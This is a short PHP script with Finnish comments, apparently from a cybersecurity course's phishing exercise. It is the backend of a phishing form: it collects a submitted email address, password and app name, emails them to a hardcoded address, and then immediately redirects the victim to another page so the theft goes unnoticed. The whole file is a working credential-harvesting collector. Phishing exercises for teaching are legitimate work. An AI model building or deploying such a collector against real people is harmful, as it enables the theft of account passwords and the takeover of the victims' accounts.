<?php
if(isset($_POST['email'])) {
 
    
    $email_to = "tahan.joku@posti.com"; // osoite minne posti lähetetään ja postin osoite
    $email_subject = "Kyberkurssin tietojenkalastelulomakkeen tiedot:";
 
    function died($error) {
        // Virheilmoitukset lomakkeen käytössä
        echo "Lomakkeen lähettämisessä havaittiin seuraavat virheet: ";
              echo $error."<br /><br />"; // tämä tulostaa mahdolliset virheet
        echo "Kättä TAKAISIN -painiketta palataksesi ja korjataksesi virheet.<br /><br />";
        die();
    }
 
	  
			// määritellään lomakkeen kentistä postin tiedot
				$email = $_POST['email'];
				$salasana = $_POST['salasana'];
				$app = $_POST['app'];
			

 
 
    $email_message = "Lomakkeen tiedot seuraavana:\n\n";
      
    function clean_string($string) {
      $bad = array("content-type","bcc:","to:","cc:","href");
      return str_replace($bad,"",$string);
    }
 
	// liittää lomakkeen tiedot määritettynä lähetettävään sähköpostiin + tyhjäväli
	
    $email_message .= "email:  ".clean_string($email)."\n";
    $email_message .= "salasana: ".clean_string($salasana)."\n";
	$email_message .= "app: ".clean_string($app)."\n";
 
// luo sähköpostin tiedot ja otsikoinnin

$headers = 'From: '.$email."\r\n".
'Reply-To: '.$email."\r\n" .
'X-Mailer: PHP/' . phpversion();
@mail($email_to, $email_subject, $email_message, $headers);  
?>
 
<!-- uudelleen ohjaus kiitos -sivulle -->

<meta http-equiv="refresh" content="0; URL='./redirect.html'" />
 
<?php
 
}
?>